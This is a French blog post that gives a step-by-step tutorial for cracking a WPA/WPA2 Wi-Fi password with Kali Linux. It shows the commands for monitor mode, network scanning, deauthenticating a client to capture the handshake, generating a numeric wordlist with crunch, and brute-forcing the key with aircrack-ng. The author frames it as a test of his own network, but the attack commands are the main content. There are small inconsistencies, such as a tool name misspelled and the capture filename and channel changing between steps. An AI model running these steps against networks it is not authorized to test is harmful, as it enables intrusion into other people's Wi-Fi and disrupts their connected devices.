---
layout: post
title:  Hacker un Wifi protégé par WPA/WPA2
description: Utilisez Kali Linux pour hacker un Wifi protégé par WPA/WPA2
date:   2017-09-19 11:23:00 +0200
tags: hack kali wifi wpa
categories: hacking
---

Le principe est le suivant:

* **Analyse** du wifi cible
* **Capture** un **WPA handshake** *(une connexion au réseau Wifi)* en déconnectant un périphérique sur le Wifi
* **Crackage** du mot de passe contenu dans le **WPA handshake** par *bruteforce*

La première étape est de mettre en place  **airmong-ng**. Pour cela on va devoir activer le **mode moniteur** de notre carte réseau. Pour cela on liste les cartes réseaux disponnibles.

```bash
# airmon-ng
```

> Si vous n'en n'avez pas, il faut vous en acheter une *(un dongle USB wifi suffit)*

Dans notre cas on voit que l'on peut utiliser notre carte réseau **wlan0**. On active donc le **mode moniteur**.

```bash
# airmon-ng start wlan0
```

A partir d'ici, la carte réseau **wlan0** n'est plus disponnible *(vous n'avez plus internet)*, et une nouvelle carte réseau apparait. On peut la retrouver en faisant un `ifconfig`. Dans mon cas, il s'agit de **wlan0mon**.

## Analyse du Wifi

 On peut donc analyser les réseaux qui se trouvent autour de nous.

```bash
# airodump-ng wlan0mon
```

Cette commande va trouver des informations supplémentaires sur les wifi dont:

* le **BSSID**, l'adresse MAC du routeur
* le **CH**annel
* l' **AUTH**, le mode d'authentification
* le **ESSID**, le nom du routeur

Parmis toutes les lignes, mon résau apparait. Pensez à noter les information car elles nous seront utiles.

```bash
BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                             
 18:D6:C7:85:7E:A0  -45        6        0    0   2  54e  WPA2 CCMP   PSK  TP-LINK_7EA0 
```

## Capture d'un WPA handshake

Un **WPA handshake** se déroule lors de la connexion d'un péripérique sur le Wifi. Notre but est d'en capturer un. Pour cela nous allons:

1. scanner le wifi pour trouver les périphériques
2. déconnecter un péripérique et attendre qu'il se reconnecte automatiquement

### Scan du Wifi

On scan donc le réseau avec la commande `airodump-ng` et les options:

* `-c` pour spécifier le channel
* `--bssid` 18:D6:C7:85:7E:A0 
* `-w` le répertoire ou seront stocké les fichiers d'output

```bash
# airodump-ng -c 10 --bssid 18:D6:C7:85:7E:A0 -w tplink  wlan0mon 
```

On laisse cette commande en arrière plan, elle va nous produire 3 fichiers donx un de type *xml*. C'est celui qui nous intéresse car il contient plus de détails sur les périphériques connectés sur le wifi.

### La déconnexion

Deux choix s'offrent à nous:

* attendre qu'un périphérique se connecte au wifi
* provoquer une déconnexion et attendre que l'appareil se reconnecte

Pour tester, je choisis de déconnecter mon smartphone. Pour cela, on trouve très facilement l' **addresse MAC** dans le fichier *tplink.kimset.netxml* generé.

```xml
<client-mac>94:EB:CD:25:E0:C1</client-mac>
<client-manuf>BlackBerry RTS</client-manuf>
```

Il suffit de noter l'adresse MAC et de lancer `aireplay-ng` avec les paramètres:

* `-0` pour envoyer un signal de désauthentification
* `-a` le BSSID de notre Wifi
*

```bash
# aireplay-ng -0 2 -a 18:D6:C7:85:7E:A0 -c 94:EB:CD:25:E0:C1 wlan0mon
```

On attend quelques secondes, et le périphérique se reconnecte automatiquement. On obtient donc un **WPA Handshake** qui est contenu dans le fichier *tplink.cpa*.


## Le crackage

Maintenant que nous avons obtenu un packet contenant le mot de passe WPA crypté, il suffit de tester plusieurs combinaisons jusqu'à en trouver un correspondante: on appelle cela un bruteforce;

### le dictionnaire

Pour trouver un mot de passe il nous faut... des mots de passe! On peut trouver des[fichiers textes de plusieurs giga-octes des mots de passe les plus utilisés](http://www.wirelesshack.org/wpa-wpa2-word-list-dictionaries.html). Dans mon cas, je sais que le mot de passe de mon Wifi contient 8 chiffres. Je vais donc utiliser `crunch` pour génerer toutes les combinaisons possibles. `crunch` utilise plusieurs paramètres:

1. la longueur minimum
2. la longueur maximum
3. les caractères à utiliser

On envoie tout ça dans un fichier *passwords.txt*.

```bash
# crunch 8 8 12345678 > passwords.txt
Crunch will now generate the following amount of data: 387420489 bytes
369 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 43046721
```

En quelques secondes on obtiens un fichier de 43046721 lignes!

### Le bruteforce

On passe à l'action. Ici nous allons effectuer bruteforcer le mot de passe. Pour cela nous utilisons `aircrack-ng` qui va tous les mots de passe présents dans notre dictionnaire. Pour cel nous avons besoin d'un **dictionnare de mots de passe**.

```bash
# aircrack-ng -a2 -b 18:D6:C7:85:7E:A0 -w /root/Desktop/passwords.txt /root/Desktop/tplink.cap
```

Et au bout de quelques temps:

![/img/blog/crack_wpa.png]




